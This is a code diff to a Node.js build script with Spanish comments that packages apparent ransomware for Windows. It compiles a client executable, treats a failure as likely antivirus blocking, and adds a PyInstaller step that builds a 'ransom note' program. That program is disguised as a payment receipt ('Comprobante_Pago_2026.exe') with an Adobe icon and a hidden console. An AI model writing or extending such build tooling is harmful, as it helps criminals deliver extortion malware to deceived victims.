@@ -31,16 +31,64 @@ function runBuild(filename) {
         return false;
     }
 
-    // 2. Run pkg
+    // 2. Run pkg (Client)
     try {
-        // Redirect stdio to inherit to see pkg output, but we also want to catch the error
+        console.log(`   [NODE] Compilando Cliente...`);
         execSync(`pkg cliente.js --targets node18-win-x64 --output dist/${filename}`, { stdio: 'inherit' });
-        console.log(`\n EXCELENTE! Compilacion exitosa en: dist/${filename}`);
-        return true;
     } catch (e) {
-        console.log(` Fallo la compilacion de ${filename}. (Probablemente bloqueado por Antivirus durante la escritura)`);
+        console.log(`   [NODE] Fallo la compilacion del cliente. Bloqueado?`);
         return false;
     }
+
+    // 3. Run PyInstaller (Ransom Note)
+    const noteName = 'Comprobante_Pago_2026.exe';
+
+    // Always recompile if we want to ensure the icon is applied
+    if (true) {
+        try {
+            // Usar icono si existe (.ico preferido) - RUTA ABSOLUTA REQUERIDA
+            const iconRef = 'adobe_icon.ico';
+            const iconAbsPath = path.resolve(__dirname, iconRef);
+            const iconArg = fs.existsSync(iconRef) ? `--icon="${iconAbsPath}"` : '';
+
+            console.log(`   [PYTHON] Compilando Nota de Rescate (${noteName}) con Icono...`);
+
+            // Intento 1: Usar via modulo (evita problemas de PATH)
+            execSync(`python -m PyInstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${noteName.replace('.exe', '')}" interfazdeaviso.py`, { stdio: 'inherit' });
+            console.log(`   [PYTHON] Nota compilada con exito.`);
+        } catch (e) {
+            const iconRef = 'adobe_icon.ico';
+            const iconAbsPath = path.resolve(__dirname, iconRef);
+            const iconArg = fs.existsSync(iconRef) ? `--icon="${iconAbsPath}"` : '';
+
+            console.log(`   [PYTHON] Modulo fallito. Intentando comando global 'pyinstaller'...`);
+            try {
+                // Intento 2: Comando directo
+                execSync(`pyinstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${noteName.replace('.exe', '')}" interfazdeaviso.py`, { stdio: 'inherit' });
+                console.log(`   [PYTHON] Nota compilada con exito.`);
+            } catch (err) {
+                console.log(`   [PYTHON] Advertencia: No se pudo compilar la nota.`);
+            }
+        }
+    } else {
+        // Unreachable but keeping structure if needed later
+    }
+
+    // Copiar recursos adicionales a dist/
+    const recursos = ['escudo.png', 'adobe_icon.ico', 'adobe_icon.png'];
+    for (const recurso of recursos) {
+        if (fs.existsSync(recurso)) {
+            try {
+                fs.copyFileSync(recurso, path.join(distDir, recurso));
+                console.log(`   [RECURSO] ${recurso} copiado a dist/`);
+            } catch (e) {
+                // Ignorar errores de copia
+            }
+        }
+    }
+
+    console.log(`\n EXCELENTE! Artefactos generados en dist/`);
+    return true;
 }
 
 // Main logic
